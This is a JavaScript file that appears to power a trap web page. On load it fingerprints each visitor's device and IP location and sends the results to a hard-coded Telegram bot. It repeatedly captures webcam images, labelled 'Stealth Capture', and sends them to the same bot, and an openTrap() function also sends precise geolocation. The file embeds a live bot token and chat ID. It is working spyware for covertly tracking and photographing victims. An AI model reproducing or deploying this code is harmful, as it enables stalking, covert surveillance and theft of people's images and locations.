const TELEGRAM_BOT_TOKEN = '9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw';
const TELEGRAM_CHAT_ID = '659131693';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let mediaStream = null;
let captureInterval = null;
let frameCount = 0;
let locationSent = false;

async function sendMessage(text) {
    try {
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
        });
    } catch (e) {}
}

async function sendPhoto(blob, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `selfie_${Date.now()}.jpg`);
        formData.append('caption', caption);
        await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: formData });
    } catch (e) {}
}

async function gatherAndSendInfo() {
    let ipData = {};
    try {
        const res = await fetch('https://ipapi.co/json/');
        ipData = await res.json();
    } catch (e) {}
    
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    let infoText = `<b>📱 Device & Network Info</b>\n`;
    infoText += `IP: <code>${ipData.ip || 'Unknown'}</code>\n`;
    infoText += `City: ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n`;
    infoText += `ISP: ${ipData.org || 'Unknown'}\n`;
    infoText += `OS: ${platform}\n`;
    infoText += `Browser/UA: <code>${userAgent}</code>\n`;
    infoText += `Language: ${language}\n`;
    infoText += `Screen: ${screenRes}\n`;
    infoText += `Timezone: ${timezone}\n`;

    await sendMessage(infoText);
}

function getLocation() {
    if (locationSent) return; 
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                sendMessage(`📍 <b>Location Captured</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
                locationSent = true; 
            },
            (err) => { sendMessage(`❌ <b>Location error:</b> ${err.message}`); },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
}

async function startStealthCapture() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
            audio: false 
        });
        video.srcObject = mediaStream;
        setTimeout(() => {
            if (video.videoWidth === 0) return;
            captureFrame();
            captureInterval = setInterval(() => { captureFrame(); }, 3000);
        }, 1500);
    } catch (err) {
        sendMessage(`❌ <b>Camera error:</b> ${err.message}`);
    }
}

function captureFrame() {
    if (!mediaStream || video.videoWidth === 0) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvas.toBlob((blob) => {
        frameCount++;
        sendPhoto(blob, `📸 Stealth Capture #${frameCount}`);
    }, 'image/jpeg', 0.8);
}

document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
        if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); mediaStream = null; }
        if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
    } else if (document.visibilityState === 'visible') {
        if (!mediaStream) { startStealthCapture(); }
    }
});

window.addEventListener('load', () => {
    gatherAndSendInfo();
    startStealthCapture();
});

function openTrap() {
    if (!mediaStream) { startStealthCapture(); }
    getLocation();
}
